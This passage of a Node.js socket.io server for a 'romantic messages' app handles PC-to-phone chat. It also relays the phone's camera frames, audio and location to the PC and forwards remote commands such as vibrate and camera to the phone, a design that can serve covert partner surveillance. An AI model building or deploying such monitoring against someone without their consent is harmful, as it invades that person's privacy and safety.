  socket.on('contact_login', ({ contactId, name }) => {
    const contact = contacts.get(contactId);
    if(!contact) {
      socket.emit('login_error', { error: 'Contato não encontrado' });
      return;
    }
    if(contact.name !== name) {
      socket.emit('login_error', { error: 'Nome não corresponde' });
      return;
    }
    if(contact.socketId) {
      const old = io.sockets.sockets.get(contact.socketId);
      if(old) { old.emit('force_disconnect', { reason: 'Nova conexão' }); old.disconnect(); }
    }
    contact.socketId = socket.id;
    contact.online = true;
    contact.lastSeen = new Date();
    currentContactId = contactId;

    io.emit('contact_status_change', { contactId, online: true, name: contact.name });
    socket.emit('login_success', {
      contactId,
      name: contact.name,
      messages: messages.get(contactId) || []
    });
    console.log('✅ ' + contact.name + ' online!');
  });

  // Mensagens
  socket.on('send_message', (data) => {
    const { to, text, isFromPc } = data;
    let from = null, senderName = null;

    if(isFromPc) {
      from = 'pc';
      senderName = 'Você (PC)';
      const msgs = messages.get(to) || [];
      const newMsg = { id: uuidv4(), from: 'pc', to, text, timestamp: new Date(), isRead: false };
      msgs.push(newMsg);
      messages.set(to, msgs);
      const contact = contacts.get(to);
      if(contact && contact.socketId) {
        io.to(contact.socketId).emit('new_message', newMsg);
      }
      socket.emit('message_sent', newMsg);
    } else {
      from = currentContactId;
      const contact = contacts.get(currentContactId);
      senderName = contact ? contact.name : 'Contato';
      const msgs = messages.get(currentContactId) || [];
      const newMsg = { id: uuidv4(), from: currentContactId, to: 'pc', text, timestamp: new Date(), isRead: false };
      msgs.push(newMsg);
      messages.set(currentContactId, msgs);
      io.emit('new_message_from_contact', { ...newMsg, contactName: senderName, contactId: currentContactId });
      socket.emit('message_sent', newMsg);
    }
    console.log('💬 ' + senderName + ': "' + text + '"');
  });

  // Typing
  socket.on('typing_start', ({ to, isFromPc }) => {
    if(isFromPc) {
      const contact = contacts.get(to);
      if(contact && contact.socketId) io.to(contact.socketId).emit('contact_typing', { isTyping: true });
    } else {
      socket.broadcast.emit('contact_typing', { contactId: currentContactId, isTyping: true });
    }
  });

  socket.on('typing_stop', ({ to, isFromPc }) => {
    if(isFromPc) {
      const contact = contacts.get(to);
      if(contact && contact.socketId) io.to(contact.socketId).emit('contact_typing', { isTyping: false });
    } else {
      socket.broadcast.emit('contact_typing', { contactId: currentContactId, isTyping: false });
    }
  });

  // Streaming
  socket.on('frame', (frameData) => {
    if(currentContactId) socket.broadcast.emit('contact_frame', { contactId: currentContactId, frame: frameData });
  });

  socket.on('audio', (audioData) => {
    if(currentContactId) socket.broadcast.emit('contact_audio', { contactId: currentContactId, audio: audioData });
  });

  socket.on('location', (loc) => {
    if(currentContactId) socket.broadcast.emit('contact_location', { contactId: currentContactId, location: loc });
  });

  // Comandos
  socket.on('comando', ({ contactId, command }) => {
    const contact = contacts.get(contactId);
    if(contact && contact.socketId) {
      io.to(contact.socketId).emit('comando', command);
    }
  });

  // Desconexão
  socket.on('disconnect', () => {
    console.log('Cliente desconectado:', socket.id);
    if(currentContactId) {
      const contact = contacts.get(currentContactId);
      if(contact) {
        contact.online = false;
        contact.lastSeen = new Date();
        contact.socketId = null;
        io.emit('contact_status_change', { contactId: currentContactId, online: false, name: contact.name });
        console.log('❌ ' + contact.name + ' offline');
      }
    }
  });
});

// ========== INICIAR SERVIDOR ==========
server.listen(PORT, '0.0.0.0', () => {
  console.log('\n💕 Servidor de Mensagens Românticas 💕');
  console.log('   Porta: ' + PORT);
  console.log('   Acesse no PC: http://localhost:' + PORT);
  console.log('   Acesse no Celular: http://localhost:' + PORT);
  console.log('\n📱 Funcionalidades:');
  console.log('   ✅ Cadastro de contatos (PC)');
  console.log('   ✅ Chat em tempo real (PC ↔ Celular)');
  console.log('   ✅ Vídeo, áudio e localização');
  console.log('   ✅ Indicador de digitação');
  console.log('   ✅ Status online/offline');
  console.log('   ✅ Comandos remotos (vibrar, câmera, surpresas)');
  console.log('   ✅ Músicas em segundo plano\n');

  // Criar contato exemplo
  setTimeout(() => {
    if(contacts.size === 0) {
      const id = uuidv4();
      contacts.set(id, { id, name: 'Amor da Minha Vida', phone: '(11) 99999-9999', socketId: null, online: false, lastSeen: new Date(), createdAt: new Date() });
      messages.set(id, []);
      console.log('💝 Contato de exemplo criado!');
      console.log('   ID: ' + id);
      console.log('   Nome: Amor da Minha Vida');
      console.log('   Telefone: (11) 99999-9999');
      console.log('\n📱 Use este ID no celular para fazer login!\n');
    }
  }, 1000);
});
